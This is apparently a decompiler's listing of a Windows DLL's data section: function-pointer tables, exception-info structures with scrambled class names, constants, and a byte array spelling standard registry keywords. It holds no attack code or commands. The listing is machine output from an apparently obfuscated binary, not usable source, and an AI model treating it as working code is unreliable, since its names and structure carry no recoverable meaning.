int (__thiscall *off_10103FA8)(void *Block, char) = &unknown_libname_13; // weak
int (__thiscall *off_10103FC8)(void *Block, char) = &sub_100436EF; // weak
int (__thiscall *off_10104024)(void *Block, char) = &sub_10045361; // weak
int (__thiscall *off_10104060[3])(void *Block, char) = { &sub_10043A27, &sub_10044C58, &sub_10045345 }; // weak
int (__thiscall *off_10104064[2])(void *Block, char) = { &sub_10044C58, &sub_10045345 }; // weak
int (__thiscall *off_10104068)(void *Block, char) = &sub_10045345; // weak
int (__stdcall *off_101040C4)(char) = &sub_10044C24; // weak
int (__thiscall *off_101040E4)(void *Block, char) = &sub_100454E2; // weak
int (__thiscall *off_101040EC)(void *Block, char) = &sub_100471C9; // weak
int (__thiscall *off_101040F4[2])(void *Block, char) = { &sub_1004743F, &sub_100478A4 }; // weak
int (__thiscall *off_101040F8)(void *Block, char) = &sub_100478A4; // weak
int (__thiscall *off_10104108)(void *Block, char) = &sub_1004AC2E; // weak
int (__thiscall *off_10104144[2])(void *Block, char) = { &sub_1004A5D5, &sub_1004AC12 }; // weak
int (__thiscall *off_10104148)(void *Block, char) = &sub_1004AC12; // weak
int (__stdcall *off_101041A4)(char) = &sub_1004A5A1; // weak
int (__thiscall *off_101041C4)(void *Block, char) = &sub_1004C80D; // weak
int (__thiscall *off_10104200)(void *Block, char) = &sub_1004C7F1; // weak
int (__stdcall *off_1010425C)(char) = &sub_1003DF54; // weak
int (__thiscall *off_10104280)(void *Block, char) = &sub_1004C94C; // weak
int (__thiscall *off_101042C4[2])(void *Block, char) = { &sub_1004D17F, &sub_1004D079 }; // weak
int (__thiscall *off_101042C8)(void *Block, char) = &sub_1004D079; // weak
int (__thiscall *off_101042D0)(void *Block, char) = &sub_1004D61F; // weak
int (__thiscall *off_101042D8)(void *Block, char) = &sub_1004DB4F; // weak
int (__thiscall *off_1010433C[2])(void *Block, char) = { &sub_1004E0DC, &sub_1004F14C }; // weak
int (__thiscall *off_10104340)(void *Block, char) = &sub_1004F14C; // weak
int (__thiscall *off_1010437C[2])(void *Block, char) = { &sub_1004E938, &sub_1004F130 }; // weak
int (__thiscall *off_10104380)(void *Block, char) = &sub_1004F130; // weak
int (__thiscall *off_101043DC)(void *Block, char) = &sub_1004F168; // weak
int (__thiscall *off_10104418)(void *Block, char) = &sub_1004E988; // weak
int (__stdcall *off_1010441C)(char) = &sub_1004E904; // weak
int (__stdcall *off_1010443C)(char) = &sub_1004E954; // weak
int (__thiscall *off_1010445C[2])(void *Block, char) = { &sub_1004F24F, &sub_10050267 }; // weak
int (__thiscall *off_10104460)(void *Block, char) = &sub_10050267; // weak
int (__thiscall *off_10104468[4])(void *Block, char) = { &sub_1004FEFA, &sub_10050BEC, &sub_100503FE, &sub_10050CBC }; // weak
int (__thiscall *off_1010446C[3])(void *Block, char) = { &sub_10050BEC, &sub_100503FE, &sub_10050CBC }; // weak
int (__thiscall *off_10104470[2])(void *Block, char) = { &sub_100503FE, &sub_10050CBC }; // weak
int (__thiscall *off_10104474)(void *Block, char) = &sub_10050CBC; // weak
int (__thiscall *off_1010447C)(void *Block, char) = &sub_10050CDB; // weak
int (__thiscall *off_10104484[3])(void *Block, char) = { &sub_10050B33, &sub_100511AA, &sub_1005180A }; // weak
int (__thiscall *off_10104488[2])(void *Block, char) = { &sub_100511AA, &sub_1005180A }; // weak
int (__thiscall *off_1010448C)(void *Block, char) = &sub_1005180A; // weak
int (__thiscall *off_101044B0)(void *Block, char) = &sub_100519F2; // weak
int (__thiscall *off_101044F4)(void *Block, char) = &sub_100521CA; // weak
int (__thiscall *off_10104500)(void *Block, char) = &sub_10052354; // weak
int (__stdcall *off_10104540)(int) = &sub_1005287D; // weak
int (__thiscall *off_10104548)(void *Block, char) = &sub_1005269E; // weak
int (__thiscall *off_10104588)(void *Block, char) = &sub_1005280C; // weak
int (__thiscall *off_101045A8)(void *Block, char) = &sub_1005288C; // weak
int (__thiscall *off_101045C4)(void *Block, char) = &sub_10052934; // weak
int (__thiscall *off_101045E0)(void *Block, char) = &sub_10052BD9; // weak
int (__thiscall *off_1010461C[2])(void *Block, char) = { &sub_1005566B, &sub_10057E73 }; // weak
int (__thiscall *off_10104620)(void *Block, char) = &sub_10057E73; // weak
int (__thiscall *off_1010465C[2])(void *Block, char) = { &sub_10056EEC, &sub_1005723C }; // weak
int (__thiscall *off_10104660)(void *Block, char) = &sub_1005723C; // weak
int (__thiscall *off_10104668)(void *Block, char) = &sub_10057E29; // weak
int (__thiscall *off_101046C8)(void *Block, char) = &sub_10057E48; // weak
int (__thiscall *off_10104724)(void *Block, char) = &sub_10056670; // weak
int (__thiscall *off_10104730)(void *Block, char) = &sub_10056F0B; // weak
int (__thiscall *off_10104770)(void *Block, char) = &sub_10056F5A; // weak
int (__stdcall *off_10104774)(char) = &sub_10057201; // weak
int (__thiscall *off_10104794)(void *Block, char) = &sub_1005725B; // weak
int (__thiscall *off_101047B4)(void *Block, char) = &sub_100718CF; // weak
__int16 word_101047C0[] = { 15581 }; // weak
_UNKNOWN unk_10104A5C; // weak
const _ThrowInfo _TI1_AVSnsziibtx_sr__ = { 0u, &sub_1000E843, NULL, &_CTA1_AVSnsziibtx_sr__ }; // idb
const _ThrowInfo _TI2_AVTyxCkOnhqdgZuatyxcko_sr__ = { 0u, &sub_1000E927, NULL, &_CTA2_AVTyxCkOnhqdgZuatyxcko_sr__ }; // idb
const _ThrowInfo _TI2_AVDkpOsublklbcJnkmkirtg_sr__ = { 0u, &sub_10006456, NULL, &_CTA2_AVDkpOsublklbcJnkmkirtg_sr__ }; // idb
const _ThrowInfo _TI2_AVScdeiYyksupovo_sr__ = { 0u, &sub_1000A814, NULL, &_CTA2_AVScdeiYyksupovo_sr__ }; // idb
const _ThrowInfo _TI5_AVBjzgFbjdoadXvizrkOkabjzgfb_jhzi_sr__ = { 0u, &sub_1000BCC4, NULL, &_CTA5_AVBjzgFbjdoadXvizrkOkabjzgfb_jhzi_sr__ }; // idb
const _ThrowInfo _TI5_AVWdtfAhnEcxcvFuptgwdtf_jhzi_sr__ = { 0u, &sub_1000BCC4, NULL, &_CTA5_AVWdtfAhnEcxcvFuptgwdtf_jhzi_sr__ }; // idb
const _ThrowInfo _TI4_AVQdlyUQBeskfuooz_jhzi_sr__ = { 0u, &sub_1000BCD7, NULL, &_CTA4_AVQdlyUQBeskfuooz_jhzi_sr__ }; // idb
const _ThrowInfo _TI5_AVCsszWkelsgXqduhacss_jhzi_sr__ = { 0u, &sub_1000BCC4, NULL, &_CTA5_AVCsszWkelsgXqduhacss_jhzi_sr__ }; // idb
const _ThrowInfo _TI5_AVDynkdllNfnaPydyqhdgDynkdllnf_jhzi_sr__ = { 0u, &sub_1000BCC4, NULL, &_CTA5_AVDynkdllNfnaPydyqhdgDynkdllnf_jhzi_sr__ }; // idb
const _ThrowInfo _TI2_AVHfpmmmiamaHpnxxaqhf_sr__ = { 0u, &sub_100209C9, NULL, &_CTA2_AVHfpmmmiamaHpnxxaqhf_sr__ }; // idb
const _ThrowInfo _TI2_AVGfnpwoMadjdwvkl_sr__ = { 0u, &sub_100209C9, NULL, &_CTA2_AVGfnpwoMadjdwvkl_sr__ }; // idb
const _ThrowInfo _TI3_AVNkwvkskhoJvvsaNkwvkskho_bjxssd_sr__ = { 0u, &sub_10015D50, NULL, &_CTA3_AVNkwvkskhoJvvsaNkwvkskho_bjxssd_sr__ }; // idb
const _ThrowInfo _TI3_AVLfeuifzffjRpmufflxh_ezrqwlx_sr__ = { 0u, &sub_1000FD78, NULL, &_CTA3_AVLfeuifzffjRpmufflxh_ezrqwlx_sr__ }; // idb
const _ThrowInfo _TI3_AVNxgFdIyuzpwZmeagwnxg_yq_sr__ = { 0u, &sub_100116E5, NULL, &_CTA3_AVNxgFdIyuzpwZmeagwnxg_yq_sr__ }; // idb
const _ThrowInfo _TI2_AVRnaLirybajtn_sr__ = { 0u, &sub_10051BDF, NULL, &_CTA2_AVRnaLirybajtn_sr__ }; // idb
const _ThrowInfo _TI2_AVVJVzywhgyue_sr__ = { 0u, &sub_1000CBA9, NULL, &_CTA2_AVVJVzywhgyue_sr__ }; // idb
const _ThrowInfo _TI1_AVXbaxizGuimmJkzwxbaxi_Xrtioo_bjxssd_sr__ = { 0u, &sub_1001312A, NULL, &_CTA1_AVXbaxizGuimmJkzwxbaxi_Xrtioo_bjxssd_sr__ }; // idb
const _ThrowInfo _TI3_AVUPQaqbVhsrnozqr_jhzi_sr__ = { 0u, &sub_1001FA54, NULL, &_CTA3_AVUPQaqbVhsrnozqr_jhzi_sr__ }; // idb
const _ThrowInfo _TI2_AVEtKqstreari_gfjjefwq_sr__ = { 0u, &sub_100209C9, NULL, &_CTA2_AVEtKqstreari_gfjjefwq_sr__ }; // idb
const _ThrowInfo _TI4_AVWdlkztgsnlAzzaqwwdlKztgsnlaz_ezrqwlx_sr__ = { 0u, &sub_1001666A, NULL, &_CTA4_AVWdlkztgsnlAzzaqwwdlKztgsnlaz_ezrqwlx_sr__ }; // idb
const _ThrowInfo _TI4_AVXcyfvsawkyZkgVqxqXcyfvsawKyzkgvqxq_ezrqwlx_sr__ =
{
  0u,
  &sub_1001666A,
  NULL,
  &_CTA4_AVXcyfvsawkyZkgVqxqXcyfvsawKyzkgvqxq_ezrqwlx_sr__
}; // idb
const _ThrowInfo _TI3_AVTohkuixgRflZavycpWtohkuIxgrflzav_qsbdzsml_sr__ =
{
  0u,
  &sub_10015D50,
  NULL,
  &_CTA3_AVTohkuixgRflZavycpWtohkuIxgrflzav_qsbdzsml_sr__
}; // idb
const _ThrowInfo _TI2_AVInuqrrgqIzqrxemfn_qsbdzsml_sr__ = { 0u, &sub_100209C9, NULL, &_CTA2_AVInuqrrgqIzqrxemfn_qsbdzsml_sr__ }; // idb
const _ThrowInfo _TI3_AVGvwHrhkGkbWwpxiPqhcwgvwh_qsbdzsml_sr__ = { 0u, &sub_10015D50, NULL, &_CTA3_AVGvwHrhkGkbWwpxiPqhcwgvwh_qsbdzsml_sr__ }; // idb
const _ThrowInfo _TI3_AVDvyHnthghyKltbjqChpwdvyhn_qsbdzsml_sr__ = { 0u, &sub_10015D50, NULL, &_CTA3_AVDvyHnthghyKltbjqChpwdvyhn_qsbdzsml_sr__ }; // idb
const _ThrowInfo _TI3_AVRcclrLlnuKrzOsvviGrcclrlln_qsbdzsml_sr__ = { 0u, &sub_10015D50, NULL, &_CTA3_AVRcclrLlnuKrzOsvviGrcclrlln_qsbdzsml_sr__ }; // idb
const _ThrowInfo _TI3_AVBtedofbPwtdhdgkk_bjxssd_sr__ = { 0u, &sub_10015D50, NULL, &_CTA3_AVBtedofbPwtdhdgkk_bjxssd_sr__ }; // idb
const _ThrowInfo _TI2_AVYitzioIvrugxaFjqyitzio_gfjjefwq_sr__ = { 0u, &sub_100209C9, NULL, &_CTA2_AVYitzioIvrugxaFjqyitzio_gfjjefwq_sr__ }; // idb
const _ThrowInfo _TI3_AVZbylvskbmCaigElrjJaazbylvs_bjxssd_sr__ = { 0u, &sub_10015D50, NULL, &_CTA3_AVZbylvskbmCaigElrjJaazbylvs_bjxssd_sr__ }; // idb
const _ThrowInfo _TI3_AVDybrxgFqcfonPmswmegdy_gfjjefwq_sr__ = { 0u, &sub_1001FA54, NULL, &_CTA3_AVDybrxgFqcfonPmswmegdy_gfjjefwq_sr__ }; // idb
const _ThrowInfo _TI3_AVFqpgtZkqrTzylfxafQpgtzkqrt_qsbdzsml_sr__ = { 0u, &sub_10015D50, NULL, &_CTA3_AVFqpgtZkqrTzylfxafQpgtzkqrt_qsbdzsml_sr__ }; // idb
const _ThrowInfo _TI2_AVMxpteqpIoxoylsrdYuvyamxpt_sr__ = { 0u, &sub_100209C9, NULL, &_CTA2_AVMxpteqpIoxoylsrdYuvyamxpt_sr__ }; // idb
const _ThrowInfo _TI2_AVEqsMbhajmjho_rce_sr__ = { 0u, &sub_10051BDF, NULL, &_CTA2_AVEqsMbhajmjho_rce_sr__ }; // idb
const _ThrowInfo _TI2_AVZdhrnpldcahnGvqzdhRnpldcahn_gfjjefwq_sr__ = { 0u, &sub_100209C9, NULL, &_CTA2_AVZdhrnpldcahnGvqzdhRnpldcahn_gfjjefwq_sr__ }; // idb
const _ThrowInfo _TI2_AVOzxflwtlqlhGovvrdoxa_oqymxuuz_sr__ = { 0u, &sub_100209C9, NULL, &_CTA2_AVOzxflwtlqlhGovvrdoxa_oqymxuuz_sr__ }; // idb
const _ThrowInfo _TI2_AVWZUKxzzjedqr_BurqUpfqufhkrx_wvnem__ = { 0u, &sub_1003589C, NULL, &_CTA2_AVWZUKxzzjedqr_BurqUpfqufhkrx_wvnem__ }; // idb
const _ThrowInfo _TI2_AVCacoolkbufhBtatiKygcAcoolkbuf_BurqUpfqufhkrx_wvnem__ =
{
  0u,
  &sub_1003589C,
  NULL,
  &_CTA2_AVCacoolkbufhBtatiKygcAcoolkbuf_BurqUpfqufhkrx_wvnem__
}; // idb
const _ThrowInfo _TI2_AVAjhjdvrQnxxcNhjkrgajh_BurqUpfqufhkrx_wvnem__ =
{
  0u,
  &sub_1003589C,
  NULL,
  &_CTA2_AVAjhjdvrQnxxcNhjkrgajh_BurqUpfqufhkrx_wvnem__
}; // idb
const _ThrowInfo _TI2_AVZwjggUslQydhlBuqridwzw_BurqUpfqufhkrx_wvnem__ =
{
  0u,
  &sub_1003589C,
  NULL,
  &_CTA2_AVZwjggUslQydhlBuqridwzw_BurqUpfqufhkrx_wvnem__
}; // idb
const _ThrowInfo _TI2_AVXjjRisoNecbwkvkq_BurqUpfqufhkrx_wvnem__ = { 0u, &sub_1003589C, NULL, &_CTA2_AVXjjRisoNecbwkvkq_BurqUpfqufhkrx_wvnem__ }; // idb
const _ThrowInfo _TI3_AVHzimnwhCawLjletbqhz_BurqUpfqufhkrx_wvnem__ = { 0u, &sub_100411B9, NULL, &_CTA3_AVHzimnwhCawLjletbqhz_BurqUpfqufhkrx_wvnem__ }; // idb
const _ThrowInfo _TI3_AVPpkkulvQjiXcsdrwppkKulvqjixc_BurqUpfqufhkrx_wvnem__ =
{
  0u,
  &sub_10040BE8,
  NULL,
  &_CTA3_AVPpkkulvQjiXcsdrwppkKulvqjixc_BurqUpfqufhkrx_wvnem__
}; // idb
const _ThrowInfo _TI3_AVEjshpkjuxcSnbgyWqejshpkj_BurqUpfqufhkrx_wvnem__ =
{
  0u,
  &sub_10040BE8,
  NULL,
  &_CTA3_AVEjshpkjuxcSnbgyWqejshpkj_BurqUpfqufhkrx_wvnem__
}; // idb
const _ThrowInfo _TI2_AVOcdumgcqHztqtdism_KjyztxNxioxocif_BurqUpfqufhkrx_wvnem__ =
{
  0u,
  &sub_1003589C,
  NULL,
  &_CTA2_AVOcdumgcqHztqtdism_KjyztxNxioxocif_BurqUpfqufhkrx_wvnem__
}; // idb
const _ThrowInfo _TI2_AVWvieApfejAneqmeAwvieapfe_gfjjefwq_sr__ = { 0u, &sub_100454BE, NULL, &_CTA2_AVWvieApfejAneqmeAwvieapfe_gfjjefwq_sr__ }; // idb
const _ThrowInfo _TI2_AVCdxOxsdsctwnrVpjjoacDxoxsdsct_BurqUpfqufhkrx_wvnem__ =
{
  0u,
  &sub_1003589C,
  NULL,
  &_CTA2_AVCdxOxsdsctwnrVpjjoacDxoxsdsct_BurqUpfqufhkrx_wvnem__
}; // idb
const _ThrowInfo _TI2_AVGADQYuondwswg_BurqUpfqufhkrx_wvnem__ = { 0u, &sub_1004D095, NULL, &_CTA2_AVGADQYuondwswg_BurqUpfqufhkrx_wvnem__ }; // idb
const _ThrowInfo _TI2_AVWFUlscSjzvhwbsf_egjpve_eu_sr__ = { 0u, &sub_10053794, NULL, &_CTA2_AVWFUlscSjzvhwbsf_egjpve_eu_sr__ }; // idb
const _ThrowInfo _TI3_AVVvetnzciTojzivXvqvVetnzcito_egjpve_eu_sr__ = { 0u, &sub_100509A5, NULL, &_CTA3_AVVvetnzciTojzivXvqvVetnzcito_egjpve_eu_sr__ }; // idb
const _ThrowInfo _TI3_AVUifutMbjzonqvbHkjmguifu_egjpve_eu_sr__ = { 0u, &sub_10050688, NULL, &_CTA3_AVUifutMbjzonqvbHkjmguifu_egjpve_eu_sr__ }; // idb
const _ThrowInfo _TI3_AVWpydsrwGEZPpowwpydsrWgezppoww_egjpve_eu_sr__ =
{
  0u,
  &sub_100509A5,
  NULL,
  &_CTA3_AVWpydsrwGEZPpowwpydsrWgezppoww_egjpve_eu_sr__
}; // idb
const _ThrowInfo _TI3_AVMnltYcbknuvQefuHuqdzqmnl_gfjjefwq_sr__ = { 0u, &sub_10015D50, NULL, &_CTA3_AVMnltYcbknuvQefuHuqdzqmnl_gfjjefwq_sr__ }; // idb
__TI_flags _TI3_AVBiklOkxkczgrKulyqiabi_gfjjefwq_sr__ = 0; // weak
const _ThrowInfo _TI2_AVKnwhszzdtjyiTfdasySqknWhszzdtjy_yq_sr__ = { 0u, &sub_10051BDF, NULL, &_CTA2_AVKnwhszzdtjyiTfdasySqknWhszzdtjy_yq_sr__ }; // idb
int dword_1012F060 = -1; // weak
int dword_1012F990 = -1153374642; // weak
int dword_1012FC10 = 1024; // weak
int dword_1012FC14 = -1023; // weak
int dword_1012FC18 = 53; // weak
int dword_1012FC1C = 11; // weak
int dword_1012FC20 = 64; // weak
int dword_1012FC24 = 1023; // weak
int dword_1012FC28 = 128; // weak
int dword_1012FC2C = -127; // weak
int dword_1012FC30 = 24; // weak
int dword_1012FC34 = 8; // weak
int dword_1012FC38 = 32; // weak
int dword_1012FC3C = 127; // weak
void *off_1012FC40 = &unk_10193DA0; // weak
int dword_1012FEE0 = 28800; // weak
int dword_1012FEE4 = 1; // weak
int dword_1012FEE8 = -3600; // weak
void *off_1012FF70 = &unk_1012FEF0; // weak
int dword_10130320 = 0; // weak
_UNKNOWN unk_10130324; // weak
int dword_10130328 = 0; // weak
int dword_1013032C = 0; // weak
int dword_10130330 = 0; // weak
int dword_10130334 = 0; // weak
int dword_10130338 = 0; // weak
int dword_1013033C = 0; // weak
int dword_10130340 = 0; // weak
int dword_10130344 = 0; // weak
int dword_10130348 = 0; // weak
int dword_1013034C = 0; // weak
int dword_10130350 = 0; // weak
int dword_10130354 = 0; // weak
_UNKNOWN unk_10130358; // weak
_UNKNOWN unk_10130370; // weak
_UNKNOWN unk_1013039E; // weak
_UNKNOWN unk_1013039F; // weak
_UNKNOWN unk_101303A0; // weak
_UNKNOWN unk_101303CA; // weak
_UNKNOWN unk_101303CB; // weak
_UNKNOWN unk_101303CC; // weak
_UNKNOWN unk_10130404; // weak
_UNKNOWN unk_1013042E; // weak
_UNKNOWN unk_1013042F; // weak
wchar_t asc_10130430[] = L"."; // idb
wchar_t word_10130434 = 0u; // idb
_UNKNOWN unk_10130436; // weak
_UNKNOWN unk_10130437; // weak
_UNKNOWN unk_10130438; // weak
wchar_t word_1013046C = 0u; // idb
_UNKNOWN unk_1013046E; // weak
_UNKNOWN unk_1013046F; // weak
wchar_t word_10130470 = 0u; // idb
wchar_t word_10130474 = 0u; // idb
wchar_t word_10130478 = 0u; // idb
wchar_t word_1013047C = 0u; // idb
_UNKNOWN unk_10130480; // weak
_UNKNOWN unk_101304C8; // weak
_UNKNOWN unk_1013052C; // weak
wchar_t asc_1013056C[] = L"\\\\.\\"; // idb
wchar_t word_10130578 = 0u; // idb
wchar_t word_1013057C = 0u; // idb
wchar_t word_10130580 = 0u; // idb
wchar_t word_10130584 = 0u; // idb
wchar_t word_10130588 = 0u; // idb
wchar_t word_1013058C = 0u; // idb
_UNKNOWN unk_1013058F; // weak
_UNKNOWN unk_10130590; // weak
wchar_t word_101305D8 = 0u; // idb
_UNKNOWN unk_101305DA; // weak
_UNKNOWN unk_101305DB; // weak
_UNKNOWN unk_101305DF; // weak
_UNKNOWN unk_101305E0; // weak
_UNKNOWN unk_10130638; // weak
_UNKNOWN unk_101306C5; // weak
_UNKNOWN unk_101306C8; // weak
_UNKNOWN unk_10130718; // weak
_UNKNOWN unk_10130760; // weak
_UNKNOWN unk_10130794; // weak
_UNKNOWN unk_101307C8; // weak
wchar_t word_10130814 = 0u; // idb
wchar_t word_10130818 = 0u; // idb
WCHAR ValueName = 0u; // idb
wchar_t word_10130820 = 0u; // idb
_UNKNOWN unk_10130830; // weak
char byte_10130877 = '\0'; // weak
_UNKNOWN unk_10130878; // weak
int dword_101308C8 = 0; // weak
char byte_101308CE = '\0'; // weak
wchar_t word_101308D0 = 0u; // idb
wchar_t asc_101308D4[] = L"\r\n"; // idb
wchar_t asc_101308DC[] = L"\""; // idb
wchar_t asc_101308E0[] = L" "; // idb
_UNKNOWN unk_101308F0; // weak
wchar_t word_10130938 = 0u; // idb
wchar_t word_1013093C = 0u; // idb
_UNKNOWN unk_1013093F; // weak
wchar_t word_10130940 = 0u; // idb
_UNKNOWN unk_10130942; // weak
_UNKNOWN unk_10130943; // weak
wchar_t word_10130944 = 0u; // idb
_UNKNOWN unk_10130946; // weak
_UNKNOWN unk_10130947; // weak
wchar_t word_10130948 = 0u; // idb
wchar_t word_1013094C = 0u; // idb
_UNKNOWN unk_101309E8; // weak
_UNKNOWN unk_10130A30; // weak
_BYTE byte_10130A7B[119] =
{
  0,
  0,
  0,
  0,
  0,
  83,
  0,
  0,
  0,
  77,
  0,
  0,
  0,
  68,
  0,
  0,
  0,
  66,
  0,
  0,
  0,
  86,
  97,
  108,
  0,
  70,
  111,
  114,
  99,
  101,
  82,
  101,
  109,
  111,
  118,
  101,
  0,
  78,
  111,
  82,
  101,
  109,
  111,
  118,
  101,
  0,
  0,
  0,
  0,
  68,
  101,
  108,
  101,
  116,
  101,
  0,
  0,
  84,
  121,
  112,
  101,
  76,
  105,
  98,
  0,
  83,
  111,
  102,
  116,
  119,
  97,
  114,
  101,
  0,
  0,
  0,
  0,
  83,
  89,
  83,
  84,
  69,
  77,
  0,
  0,
  83,
  69,
  67,
  85,
  82,
  73,
  84,
  89,
  0,
  0,
  0,
  0,
  83,
  65,
  77,
  0,
  77,
  105,
  109,
  101,
  0,
  0,
  0,
  0,
  72,
  97,
  114,
  100,
  119,
  97,
  114,
  101,
  0,
  0
}; // weak
_UNKNOWN unk_10130AF2; // weak
_UNKNOWN unk_10130AF3; // weak
_UNKNOWN unk_10130AFE; // weak
_UNKNOWN unk_10130AFF; // weak
_UNKNOWN unk_10130B09; // weak
_UNKNOWN unk_10131127; // weak
_BYTE byte_101311DE[2] = { 0, 0 }; // weak
_UNKNOWN unk_10131826; // weak
_UNKNOWN unk_10131827; // weak
_UNKNOWN unk_10131976; // weak
_UNKNOWN unk_10131977; // weak
_UNKNOWN unk_101319BE; // weak
_UNKNOWN unk_10131C06; // weak
_UNKNOWN unk_10131C07; // weak
_UNKNOWN unk_10131C82; // weak
_UNKNOWN unk_10131C83; // weak
_UNKNOWN unk_10131D5E; // weak
_UNKNOWN unk_10132A5E; // weak
_UNKNOWN unk_10132A5F; // weak
_UNKNOWN unk_10132BFE; // weak
_UNKNOWN unk_10132BFF; // weak
_UNKNOWN unk_10132CD2; // weak
_UNKNOWN unk_10132EEA; // weak
_UNKNOWN unk_10132EEB; // weak
_UNKNOWN unk_10132FBE; // weak
_UNKNOWN unk_10132FBF; // weak
_UNKNOWN unk_10133062; // weak
_UNKNOWN unk_101332E6; // weak
_UNKNOWN unk_101332E7; // weak
_UNKNOWN unk_10133326; // weak
_UNKNOWN unk_10133327; // weak
_UNKNOWN unk_1013335E; // weak
_UNKNOWN unk_1013335F; // weak
_UNKNOWN unk_1013419F; // weak
_UNKNOWN unk_1013429A; // weak
_UNKNOWN unk_1013429B; // weak
_UNKNOWN unk_101342D6; // weak
_UNKNOWN unk_101342D7; // weak
_UNKNOWN unk_10134376; // weak
_UNKNOWN unk_10134377; // weak
_UNKNOWN unk_101343EE; // weak
_UNKNOWN unk_101343EF; // weak
_UNKNOWN unk_10134496; // weak
_UNKNOWN unk_10134A67; // weak
_UNKNOWN unk_10134AAE; // weak
_UNKNOWN unk_10134AAF; // weak
_UNKNOWN unk_10134AF6; // weak
_UNKNOWN unk_10134AF7; // weak
_UNKNOWN unk_10134EDE; // weak
_UNKNOWN unk_10134EDF; // weak
_UNKNOWN unk_10134F1E; // weak
_UNKNOWN unk_10134F1F; // weak
_UNKNOWN unk_10135062; // weak
_UNKNOWN unk_10135676; // weak
_UNKNOWN unk_10135677; // weak
_UNKNOWN unk_101356A6; // weak
_UNKNOWN unk_101356A7; // weak
_UNKNOWN unk_101357BA; // weak
_UNKNOWN unk_10136FE6; // weak
_UNKNOWN unk_10136FE7; // weak
_UNKNOWN unk_10137066; // weak
_UNKNOWN unk_10137067; // weak
_UNKNOWN unk_101370B6; // weak
_UNKNOWN unk_101370B7; // weak
_UNKNOWN unk_101370F6; // weak
_UNKNOWN unk_101370F7; // weak
_UNKNOWN unk_1013713A; // weak
_UNKNOWN unk_1013713B; // weak
_UNKNOWN unk_10137303; // weak
_UNKNOWN unk_1013733E; // weak
_UNKNOWN unk_1013733F; // weak
_UNKNOWN unk_1013739A; // weak
_UNKNOWN unk_1013739B; // weak
_UNKNOWN unk_10139833; // weak
_UNKNOWN unk_1013986E; // weak
_UNKNOWN unk_1013986F; // weak
_UNKNOWN unk_101398EE; // weak
_UNKNOWN unk_101398EF; // weak
_UNKNOWN unk_1013993A; // weak
_UNKNOWN unk_1013993B; // weak
_UNKNOWN unk_10139976; // weak
_UNKNOWN unk_10139977; // weak
_UNKNOWN unk_101399F6; // weak
char byte_1013DA12 = '\0'; // weak
_UNKNOWN unk_1013E76E; // weak
_UNKNOWN unk_1013E76F; // weak
_UNKNOWN unk_1013E876; // weak
_UNKNOWN unk_1013E877; // weak
_UNKNOWN unk_1013E8BE; // weak
_UNKNOWN unk_1013EA0F; // weak
_UNKNOWN unk_1013EADA; // weak
_UNKNOWN unk_1013EADB; // weak
_UNKNOWN unk_1013EB1A; // weak
_UNKNOWN unk_1013EB1B; // weak
_UNKNOWN unk_1013FB8F; // weak
_UNKNOWN unk_1013FC6E; // weak
_UNKNOWN unk_1013FC6F; // weak
_UNKNOWN unk_1013FCE6; // weak
_UNKNOWN unk_1013FCE7; // weak
char byte_1013FD2E = '\x01'; // weak
_UNKNOWN unk_1014012E; // weak
_UNKNOWN unk_1014012F; // weak
_UNKNOWN unk_10140166; // weak
_UNKNOWN unk_10140167; // weak
_UNKNOWN unk_101401B6; // weak
_UNKNOWN unk_101401B7; // weak
_UNKNOWN unk_1014032A; // weak
_UNKNOWN unk_1014032B; // weak
_UNKNOWN unk_1014043A; // weak
_UNKNOWN unk_1014043B; // weak
_UNKNOWN unk_1014151E; // weak
_UNKNOWN unk_1014151F; // weak
_UNKNOWN unk_101415F6; // weak
_UNKNOWN unk_101415F7; // weak
_UNKNOWN unk_1014163E; // weak
_UNKNOWN unk_10142543; // weak
_UNKNOWN unk_1014257E; // weak
_UNKNOWN unk_1014257F; // weak
_UNKNOWN unk_1014267A; // weak
_UNKNOWN unk_1014267B; // weak
_UNKNOWN unk_101441C3; // weak
_UNKNOWN unk_1014424A; // weak
_UNKNOWN unk_1014424B; // weak
_UNKNOWN unk_10144352; // weak
_UNKNOWN unk_10144353; // weak
_UNKNOWN unk_101443D6; // weak
_UNKNOWN unk_101443D7; // weak
_UNKNOWN unk_1014442A; // weak
_UNKNOWN unk_1014442B; // weak
_UNKNOWN unk_101444EE; // weak
_UNKNOWN unk_10144D02; // weak
_UNKNOWN unk_10144D03; // weak
_UNKNOWN unk_10144D3E; // weak
_UNKNOWN unk_10144D3F; // weak
_UNKNOWN unk_10144D8E; // weak
_UNKNOWN unk_10144F5E; // weak
_UNKNOWN unk_10144F5F; // weak
_UNKNOWN unk_1014512A; // weak
_UNKNOWN unk_1014512B; // weak
_UNKNOWN unk_10145162; // weak
_UNKNOWN unk_101743E8; // weak
_UNKNOWN unk_10174430; // weak
_UNKNOWN unk_10174468; // weak
_UNKNOWN unk_10174494; // weak
_UNKNOWN unk_101744C0; // weak
_UNKNOWN unk_101744EC; // weak
_UNKNOWN unk_10174518; // weak
_UNKNOWN unk_10174544; // weak
_UNKNOWN unk_10174570; // weak
_UNKNOWN unk_1017459C; // weak
_UNKNOWN unk_101745C8; // weak
_UNKNOWN unk_101745F4; // weak
_UNKNOWN unk_10174620; // weak
_UNKNOWN unk_1017465C; // weak
_UNKNOWN unk_1017469C; // weak
_UNKNOWN unk_101746D8; // weak
_UNKNOWN unk_10174718; // weak
_UNKNOWN unk_10174754; // weak
_UNKNOWN unk_10174790; // weak
_UNKNOWN unk_101747D0; // weak
_UNKNOWN unk_101747FC; // weak
_UNKNOWN unk_1017482C; // weak
_UNKNOWN unk_10174858; // weak
_UNKNOWN unk_10174884; // weak
_UNKNOWN unk_101748B0; // weak
_UNKNOWN unk_101748DC; // weak
_UNKNOWN unk_10174908; // weak
_UNKNOWN unk_10174934; // weak
_UNKNOWN unk_10174960; // weak
wchar_t word_1017498C = 0u; // idb
wchar_t word_10174990 = 0u; // idb
wchar_t asc_10174994[] = L" "; // idb
wchar_t asc_10174998[] = L" "; // idb
wchar_t word_1017499C = 0u; // idb
wchar_t asc_101749A0[] = L"\r\n"; // idb
wchar_t word_101749AC = 0u; // idb
wchar_t word_101749B0 = 0u; // idb
wchar_t word_101749B4 = 0u; // idb
wchar_t word_101749B8 = 0u; // idb
char asc_101749BC[3] = "/]"; // weak
char asc_101749C0[3] = "/]"; // weak
char asc_101749C4[3] = "/]"; // weak
char asc_101749C8[3] = "/]"; // weak
wchar_t word_101749CC = 0u; // idb
wchar_t a0000[] = L"0000"; // idb
wchar_t a0[] = L"0"; // idb
wchar_t asc_101749E0[] = L"."; // idb
wchar_t asc_101749E4[] = L"_"; // idb
wchar_t word_101749EC = 0u; // idb
